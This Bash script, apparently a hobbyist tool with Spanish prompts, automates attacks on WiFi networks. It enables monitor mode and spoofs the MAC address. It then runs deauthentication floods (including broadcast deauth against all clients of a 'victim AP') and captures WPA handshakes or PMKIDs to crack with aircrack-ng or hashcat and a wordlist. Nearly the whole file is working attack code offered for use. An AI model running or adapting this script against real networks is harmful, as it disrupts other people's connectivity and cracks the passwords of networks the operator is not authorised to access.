#!/bin/bash

# Author: Adrián Luján Muñoz ( aka clhore )

# Colours
readonly greenColour="\e[0;32m\033[1m"
readonly endColour="\033[0m\e[0m"
readonly redColour="\e[0;31m\033[1m"
readonly blueColour="\e[0;34m\033[1m"
readonly yellowColour="\e[0;33m\033[1m"
readonly purpleColour="\e[0;35m\033[1m"
readonly turquoiseColour="\e[0;36m\033[1m"
readonly grayColour="\e[0;37m\033[1m"

trap ctrl_c INT

function ctrl_c(){
	echo -e "\n${yellowColour}[*]${endColour}${grayColour}Saliendo${endColour}"
	tput cnorm; airmon-ng stop "${networkCard}mon" > /dev/null 2>&1
	ip link set ${networkCard} down >/dev/null 2>&1; macchanger -p ${networkCard} >/dev/null 2>&1
	ip link set ${networkCard} up >/dev/null 2>&1; sleep 0.25; systemctl start NetworkManager >/dev/null 2>&1
	exit 0
}

function help_panel(){
	echo -e "${yellowColour}[*] ${endColour}${grayColour}USO:${endColour} ./wifi-host [options]"
	echo -e "\n\t${yellowColour}--system${endColour}\t-  ${grayColour}arch [0] | debian [1] | ubuntu [2] ${endColour}"
	echo -e "\t${yellowColour}--sys${endColour}"
	echo -e "\t${yellowColour}-s      ${endColour}"
	echo -e "\n\t${yellowColour}--install${endColour}\t-  ${grayColour}true  [ Install the required packages ]${endColour}"
	echo -e "\t\t\t   ${grayColour}false [ Skip the installs the necessary packages ]${endColour}"
	echo -e "\t\t\t   ${grayColour}(defauld value is true${endColour})"
	echo -e "\n\t${yellowColour}--attack-mode${endColour}\t-  ${grayColour}0  [ DEAUTH ATTACK ]${endColour}"
        echo -e "\t${yellowColour}-m      ${endColour}\t-  ${grayColour}1  [ HANDSHAKE ATTACK ]${endColour}"
        echo -e "\t\t\t${grayColour}-  ${grayColour}2  [ PMKID ATTACK ]${endColour}"
	echo -e "\n\t${yellowColour}--interface${endColour}\t-  ${grayColour}Select your interface [ Ej: wlan0 ]${endColour}"
	echo -e "\t${yellowColour}-i      ${endColour}"
        echo -e "\n\t${yellowColour}--bssid  ${endColour}\t-  ${grayColour}Enter the bssid of the victim AP [ Ej: 80:8D:B7:38:73:E0 ]${endColour}"
        echo -e "\n\t${yellowColour}--channel${endColour}\t-  ${grayColour}Enter the channel of the victim AP [ Ej: 6 ]${endColour}"
	echo -e "\n\t${yellowColour}--station${endColour}\t-  ${grayColour}Enter the mac of the device to de-authenticate [ Ej: 72:F1:AE:B0:C8:0E ]${endColour}"
	echo -e "\n\t${yellowColour}--more-options${endColour}\t-  ${grayColour}[ Ej: 4,20,8 ]"
        echo -e "\t\t\t${grayColour}   ${grayColour}(4s de-authentication | 20s attack interval | 8 de-authentication attacks)${endColour}"
	echo -e "\t\t\t${grayColour}   ${grayColour}false [ HANDSHAKE ATTACK: 4,20,4 | DEAUTH: manual stop ]${endColour}"
        echo -e "\n\t${yellowColour}--rute   ${endColour}\t-  ${grayColour}[ Used in HANDSHAKE attack and PMKID attack ]${endColour}"
	echo -e "\n\t${yellowColour}--r${endColour}"
	echo -e ''; exit 0
}

function dependencies(){
	tput civis
	clear; DEPENDENCIES=(xterm aircrack-ng hcxdumptool hashcat macchanger)

	echo -ne "${yellowColour}[*]${endColour}${grayColour} Comprobando programas necesarios...${endColour}";
	echo -n = ;
	sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done
	echo ""
	sleep 2

	for PROGRAM in "${DEPENDENCIES[@]}"; do
		echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Herramienta${endColour}${purpleColour} $PROGRAM${endColour}${blueColour}...${endColour}"

		test -f /usr/bin/$PROGRAM

		if [ "$(echo $?)" == "0" ]; then
			echo -e " ${greenColour}(V)${endColour}"
		else
			if [ "$PROGRAM" == "xterm" ]; then
				echo "XTerm*selectToClipboard: true" > ~/.Xresources; xrdb -merge ~/.Xresources &>/dev/null
			fi

			echo -e " ${redColour}(X)${endColour}\n"
			echo -e "${yellowColour}[*]${endColour}${grayColour} Instalando herramienta ${endColour}${blueColour}$PROGRAM${endColour}${yellowColour}...${endColour}"

			if [ "$SYSTEM_USER" == "arch" ]; then
				pacman -S --noconfirm $PROGRAM > /dev/null 2>&1
			elif [ "$SYSTEM_USER" == "debian" ] || [ "$SYSTEM_USER" == "ubuntu" ]; then
				apt install $PROGRAM -y > /dev/null 2>&1
			elif [ "$SYSTEM_USER" == "fedora" ]; then
				dnf install $PROGRAM -y > /dev/null 2>&1
			else
				echo -e "${redColour}:: Error en la verificacion de tu sistema operativo${endColour}"
				ctrl_c
			fi
		fi; sleep 1
	done
}

function interfaceModeMonitor(){
	clear; inface=$(ip address | cut -d ' ' -f 2 | xargs | tr ' ' '\n' | tr -d ':' > interface)

	if [ "$networkCard" == "" ]; then
		sleep 1; echo -e "${yellowColour}LISTA DE INTERFACES DE RED:${endColour}"

		let count=0; for interface in $(cat interface); do
			echo -e "\t${yellowColour}${count}:${yellowColour} ${grayColour}$interface${grayColour}"; sleep 0.25
			let count++
		done
	fi

	if [ "$networkCard" == "" ]; then
		checker=0; while [ $checker -ne 1 ]; do
			echo -en "${yellowColour}Network card (Ej: 1): ${endColour}" && read networkCardNum
			networkCardList=($(a=$(cat interface); echo $a)); networkCard="${networkCardList[${networkCardNum}]}"

			for interface in $(cat interface); do
				if [ "$networkCard" == "$interface" ]; then
					checker=1
				fi; sleep 0.5
			done
		done
	fi; rm interface

	sleep 0.25; echo -e "${redColour}::${endColour} ${grayColour}Configurando netword cart${endColour}"
	sleep 0.25; airmon-ng start $networkCard >/dev/null 2>&1; airmon-ng check kill >/dev/null 2>&1
	ip addr list ${networkCard}mon >/dev/null 2>&1

	if [ "$(echo $?)" -eq "0" ]; then
		echo -e "${redColour}::${endColour} ${grayColour}Network cart modo monitor${endColour}"
		ip link set ${networkCard}mon down >/dev/null 2>&1; macchanger -a ${networkCard}mon >/dev/null 2>&1
		ip link set ${networkCard}mon up >/dev/null 2>&1; sleep 0.25
		echo -e "${redColour}::${endColour} ${grayColour}Network cart MAC aleatoria${endColour}"
		codeCheck=0
	else
		echo -e "${redColour}::Error${endColour}"
		codeCheck=1
	fi
}

function attackDeauth (){
	if [ "$BSSID" == "" ] && [ "$CH" == "" ]; then
		until [[ $opt =~ (y|n|Y|N) ]]; do
			echo -en "\t${yellowColour}Conoces el [BSSID y CH] del AP victima(y/n): ${endColour}" && read opt
		done

		if [ "$opt" == "n" ] || [ "$opt" == "N" ]; then
			xterm -hold -e "airodump-ng ${networkCard}mon" 2> /dev/null &
			xtermAirodumpPID=$!

			echo -en "\t${yellowColour}BSSID: ${endColour}" && read BSSID
			echo -en "\t${yellowColour}Channel: ${endColour}" && read CH
			sleep 1; kill -9 $xtermAirodumpPID; wait $xtermAirodumpPID 2>/dev/null
		else
			echo -en "\t${yellowColour}BSSID: ${endColour}" && read BSSID
			echo -en "\t${yellowColour}Channel: ${endColour}" && read CH
		fi
	fi

	xterm -hold -e "airodump-ng --bssid $BSSID --channel $CH --write /dev/null ${networkCard}mon" 2>/dev/null &
        xtermAirodump_AP_PID=$!; sleep 1

	if [ "$ST" == "" ]; then
		until [[ $mode =~ (y|n|Y|N) ]]; do
			echo -en "\t${yellowColour}De-autenticación GLOBAL(y/n): ${endColour}" && read mode
        	done

		if [ "$mode" == "y" ] || [ "$mode" == "Y" ]; then
			ST='FF:FF:FF:FF:FF:FF'
		else
			echo -en "\t${yellowColour}STATYON: ${endColour}" && read ST
		fi
	fi

	if [ "$MORE_OPT" == "true" ]; then
		opt=""; if [[ "$numS" == "" && "$numSI" == "" && "$num" == "" ]] || [[ "$numS" == "true" && "$numSI" == "true" && "$num" == "true" ]]; then
			until [[ $opt =~ (y|n|Y|N) ]]; do
				echo -en "\t${yellowColour}Mas opciones(y/n): ${endColour}" && read opt
        		done
		fi

		if [[ "$opt" == "y" || "$opt" == "Y" ]]; then
			echo -en "\t${yellowColour}Duracion (s): ${endColour}" && read numS; sleep 0.5
			echo -en "\t${yellowColour}Intervalo (s): ${endColour}" && read numSI; sleep 0.5
			echo -en "\t${yellowColour}Numero de veces: ${endColour}" && read num; sleep 0.5
		fi

		if [[ "$opt" == "n" || "$opt" == "N" ]]; then MORE_OPT="false"; numS=""; fi

		if [[ "$numS" != "" && "$numSI" != "" && "$num" != "" && "$BSSID" != "" && "$ST" != "" ]]; then
    			for (( c=1; c<=$num; c++ )); do
				xterm -hold -e "aireplay-ng --deauth 1111 -a $BSSID -c ${ST} ${networkCard}mon 2>/dev/null" 2>/dev/null &
				xtermAireplayPIB=$!
				sleep $numS; kill -9 $xtermAireplayPIB; wait $xtermAireplayPIB 2>/dev/null; sleep $numSI
			done
		fi
	fi

	if [ "$MORE_OPT" != "true" ]; then
		xterm -hold -e "aireplay-ng --deauth 1111 -a $BSSID -c ${ST} ${networkCard}mon 2>/dev/null" 2>/dev/null &
		xtermAireplayPIB=$!
		sleep 0.5; echo -ne "${redColour}::${endColour} ${grayColour}Para matar el ataque presione [ENTER]: ${endColour}"; read
		sleep 0.5; kill -9 $xtermAireplayPIB; wait $xtermAireplayPIB &>/dev/null; sleep 0.5
	fi; kill -9 $xtermAirodump_AP_PID &>/dev/null; wait $xtermAirodump_AP_PID &>/dev/null; sleep 0.5; ctrl_c
}

function attackHandshake(){
	if [ "$BSSID" == "" ] && [ "$CH" == "" ]; then
		xterm -hold -e "airodump-ng ${networkCard}mon" 2> /dev/null &
		xtermAirodumpPID=$!

		echo -ne "\t${yellowColour}BSSID: ${endColour}" && read BSSID
		echo -ne "\t${yellowColour}Channel: ${endColour}" && read CH
		sleep 1; kill -9 $xtermAirodumpPID; wait $xtermAirodumpPID 2>/dev/null
	fi

	xterm -hold -e "airodump-ng --bssid $BSSID --channel $CH --write Captura ${networkCard}mon" 2>/dev/null &
	xtermAirodump_AP_PID=$!; sleep 1

	if [ "$ST" == "" ]; then
		until [[ $mode =~ (y|n|Y|N) ]]; do
			echo -en "\t${yellowColour}De-autenticación GLOBAL(y/n): ${endColour}" && read mode
        	done

		if [ "$mode" == "y" ] || [ "$mode" == "Y" ]; then
			ST='FF:FF:FF:FF:FF:FF'
		else
			echo -en "\t${yellowColour}STATYON: ${endColour}" && read ST
		fi
	fi

	if [ "$MORE_OPT" == "true" ]; then #|| [[ "$numS" != "" && "$numSI" != "" && "$num" != "" ]]; then
		echo -en "\t${yellowColour}Duracion (s): ${endColour}" && read numS; sleep 0.5
		echo -en "\t${yellowColour}Intervalo (s): ${endColour}" && read numSI; sleep 0.5
		echo -en "\t${yellowColour}Numero de veces: ${endColour}" && read num; sleep 0.5
	fi

	if [ "$MORE_OPT" == "false" ]; then numS=4; numSI=20; num=4; fi

	for (( c=1; c<=$num; c++ )); do
		xterm -hold -e "aireplay-ng --deauth 1111 -a $BSSID -c ${ST} ${networkCard}mon 2>/dev/null" 2>/dev/null &
        	xtermAireplayPID=$!
		sleep $numS; kill -9 $xtermAireplayPID; wait $xtermAireplayPID 2>/dev/null; sleep $numSI
	done

	echo -e "${redColour}::${endColour} ${grayColour}Esperando 10 segusdos${endColour}"
	sleep 10; kill -9 $xtermAirodump_AP_PID; wait $xtermAirodump_AP_PID 2>/dev/null

	if [ "$ruteDic" == "" ]; then echo -en "\t${yellowColour}Ruta diccionario: ${endColour}" && read ruteDic; fi

	xterm -hold -e "aircrack-ng -w $ruteDic -b $BSSID  Captura-01.cap" 2>/dev/null &

	echo -e "\t${redColour}::${endColour} ${grayColour}Crack Handshake${scanTimeout}(s)${endColour}"

	if [ "$CAPTURE_DELETE" == "true" ]; then
		sleep 1; until [[ $capOPT =~ (y|n|Y|N) ]]; do
			echo -en "\t${yellowColour}Eliminar captura(y/n): ${endColour}" && read capOPT
        	done; sleep 1

		if [ "$capOPT" == "y" ] || [ "$capOPT" == "Y" ]; then
			rm Captura* 2>/dev/null
			sleep 1; echo -e "\t\t${redColour}::${endColour} ${grayColour}Capturas borradas${endColour}"
			sleep 1; echo -e "\t\t${redColour}::${endColour} ${grayColour}Archivos temporales borrados${endColour}"
		fi
	fi; sleep 1; ctrl_c
}

function attackPMKID(){
	echo -en "\t${yellowColour}Modo (auto/manual): ${endColour}" && read mode

	if [ "$mode" == "auto" ]; then

		echo -ne "\t${yellowColour}Duracion del escaneo(s):${endColour}" && read scanTimeout
		echo -ne "\t${yellowColour}Comenzar escaneo [ENTER] ${endColour}" && read

		xterm -hold -e "hcxdumptool -i ${networkCard}mon --enable_status=1 -o Captura.pcapng" 2>/dev/null &
		xtermHcxdumptoolPID=$!

		sleep 0.5; echo -e "\t\t${redColour}::${endColour} ${grayColour}El escaneo durara ${scanTimeout}(s)${endColour}"
		sleep $scanTimeout; kill -9 $xtermHcxdumptoolPID; wait $xtermHcxdumptoolPID 2>/dev/null
	elif [ "$mode" == "manual" ];then
		echo -ne "\t${yellowColour}Comenzar escaneo [ENTER] ${endColour}" && read

		xterm -hold -e "hcxdumptool -i ${networkCard}mon --enable_status=1 -o Captura.pcapng" 2>/dev/null &
		xtermHcxdumptoolPID=$!

		sleep 1; echo -e "\t\t${redColour}::${endColour} ${grayColour}Escaneo en ejecucion${endColour}"
		echo -e "\t${yellowColour}Parrar escaneo [ENTER] ${endColour}" && read

		sleep 1; kill -9 $xtermHcxdumptoolPID; wait $xtermHcxdumptoolPID 2>/dev/null
	else
		ctrl_c
	fi

	echo -ne "\t${yellowColour}Crack by (aircrack/hashcat):${endColour}" && read crackMode
	echo -en "\t${yellowColour}Ruta diccionario: ${endColour}" && read ruteDic

	if [ "$crackMode" == "aircrack" ]; then
		echo -e "\t\t${redColour}::${endColour} ${grayColour}Captura.pcapng >> Captura.pcap${endColour}"
		tcpdump -r Captura.pcapng -w Captura.pcap 1>/dev/null 2>&1
		echo -e "\t\t${redColour}::${endColour} ${grayColour}Inicio de furza bruta${endColour}"
		aircrack-ng -w $ruteDic Captura.pcap
	elif [ "$crackMode" == "hashcat" ]; then
		echo -e "\t\t${redColour}::${endColour} ${grayColour}Extrallendo hashes${endColour}"
		hcxpcapngtool --pmkid=myHashes Captura.pcapng 1>/dev/null 2>&1

		test -f myHashes

		if [ "$(echo $?)" == "0" ]; then
			echo -e "\t\t${redColour}::${endColour} ${grayColour}Inicio de furza bruta${endColour}"
			hashcat -m 16800 $ruteDic myHashes -d 1 --force
		else
			ctrl_c
		fi
	else
		ctrl_c
	fi
}

function dicctionary(){
	echo -en "\${yellowColour}Ruta diccionario: ${endColour}" && read ruteDic

	let numLineas=$(wc $ruteDic | xargs | awk '{print $1}'); sleep 1
        let resto=$numLineas%2; mkdir .TMP 2>/dev/null

        if [ $resto -eq 0  ]; then
		let numReferi=2
        else
               	let numReferi=3
       	fi

     	let numPasswords=$numLineas/$numReferi; sleep 0.5
       	let count=$(echo $numPasswords); sleep 0.5
	echo -e "\t\t${redColour}::${endColour} ${grayColour}Creando diccionarios en la carpeta .TMP${endColour}"
        for (( c=1; c<=$numReferi; c++ ))
        do
		echo -e "\t\t${redColour}::${endColour} ${grayColour}Creando dict${c}${endColour}"
                echo "$(head -n $count $ruteDic | tail -n $numPasswords)" > .TMP/dict${c}.txt; sleep 1
                let count+=$numPasswords
       done
}

function attack(){
	if [ "$attackMode" == "" ]; then
		until [[ $attackMode =~ (DEAUTH|HANDSHAKE|PMKID|0|1|2) ]]; do
			echo -ne "\n${yellowColour}[*] Modo de ataque (DEAUTH/HANDSHAKE/PMKID): ${endColour}" & read attackMode
                done
	fi

	if [[ "$attackMode" == "DEAUTH" || "$attackMode" == "deauth" || "$attackMode" == "0" ]]; then attackDeauth
	elif [[ "$attackMode" == "HANDSHAKE" || "$attackMode" == "handshake" || "$attackMode" == "1" ]]; then attackHandshake
	elif [[ "$attackMode" == "PMKID" || "$attackMode" == "pmkid" || "$attackMode" == "2" ]]; then attackPMKID
	else echo -e "${redColour}:: Modo de ataque no valido${endColour}"; ctrl_c
	fi
}

function defauld_value(){
#       variables["--install"]="INSTALL"
	if [ "$INSTALL" == "" ]; then INSTALL="true"; fi

#	variables["--more-options"]="MORE_OPT"
	if [ "$MORE_OPT" == "" ]; then MORE_OPT="true"; fi
	if [ "$MORE_OPT" == "FALSE" ]; then MORE_OPT="false"; fi
	if [ "$MORE_OPT" == "DEFAULD" ]; then MORE_OPT="defauld"; fi

#	variables["--rute"]="ruteDic"
	if [ "$ruteDic" != "" ]; then test -f "$ruteDic"; if [ $? -ne 0 ]; then ctrl_c; fi; fi

#       variables["--capture-delete"]="CAPTURE_DELETE"
	if [ "$CAPTURE_DELETE" == "" ]; then CAPTURE_DELETE="false"; fi
}

#echo "XTerm*selectToClipboard: true" > ~/.Xresources
#xrdb -merge ~/.Xresources

# main function
if [ "$(id -u)" == "0" ]; then
	declare -A array=([-h]="-h" [--help]="--help" [--h]="--h" [-help]="-help")
	for i in "${array[@]}"; do
		if [ $1 ]; then env test ${array[$1]+_} 2>/dev/null && help_panel; fi
	done

	declare -i counter=0; declare -i index=1
	declare -A arguments=(); declare -A variables=()

	variables["--station"]="ST"
	variables["--bssid"]="BSSID"
	variables["--channel"]="CH"
	variables["--interface"]="networkCard"
	variables["--system"]="SYSTEM_USER"
	variables["--sys"]="SYSTEM_USER"
	variables["--attack-mode"]="attackMode"
	variables["--install"]="INSTALL"
	variables["--more-options"]="MORE_OPT"
	variables["--rute"]="ruteDic"
	variables["--capture-delete"]="CAPTURE_DELETE"

	variables["-i"]="networkCard"
	variables["-s"]="SYSTEM_USER"
	variables["-m"]="attackMode"
	variables["-r"]="ruteDic"

	for i in "$@"; do
		arguments[$index]=$i;
		prev_index="$(expr $index - 1)";

		if [[ $i == *"="* ]]; then argument_label=${i%=*}
    		else argument_label=${arguments[$prev_index]}; fi

  		if [[ -n $argument_label ]]; then
    			if [[ -n ${variables[$argument_label]} ]]; then
      				if [[ $i == *"="* ]]; then
					declare ${variables[$argument_label]}=${i#$argument_label=}
        			else
					declare ${variables[$argument_label]}=${arguments[$index]}
      				fi
    			fi
  		fi

  		index=index+1;
	done; defauld_value

	if [[ "$MORE_OPT" != "false" && "$MORE_OPT" != "" ]]; then
		numS=$(echo "$MORE_OPT" | cut -d "," -f 1); numSI=$(echo "$MORE_OPT" | cut -d "," -f 2)
		num=$(echo "$MORE_OPT" | cut -d "," -f 3); #MORE_OPT="mode-term"
	fi

	until [[ $SYSTEM_USER =~ (arch|debian|ubuntu|fedora) ]]; do
                echo -ne "${yellowColour}[*] Sistema operativo [arch/debian/ubuntu/fedora]: ${endColour}" & read SYSTEM_USER

                if [ "$SYSTEM_USER" == "0" ]; then SYSTEM_USER="arch"; fi
                if [ "$SYSTEM_USER" == "1" ]; then SYSTEM_USER="debian"; fi
                if [ "$SYSTEM_USER" == "2" ]; then SYSTEM_USER="ubuntu"; fi
		if [ "$SYSTEM_USER" == "3" ]; then SYSTEM_USER="fedora"; fi
        done

	#if [[ "$INSTALL" == "true" || "$INSTALL" == "TRUE" ]]; then dependencies; ctrl_c; fi

	if [ "$SYSTEM_USER" == "arch" ] || [ "$SYSTEM_USER" == "debian" ] || [ "$SYSTEM_USER" == "ubuntu" ] || [ "$SYSTEM_USER" == "fedora" ]; then
		clear; if [[ "$INSTALL" == "true" || "$INSTALL" == "TRUE" ]]; then dependencies; fi; codeCheck=1
		while :
		do
			if [ "$codeCheck" == "1" ]; then interfaceModeMonitor; else attack; fi
		done
	else
		echo -e "${redColour}:: Error en la verificacion de tu sistema operativo${endColour}"
	fi
else
	echo -e "${redColour}Ejecute el script como root${endColour}"
fi
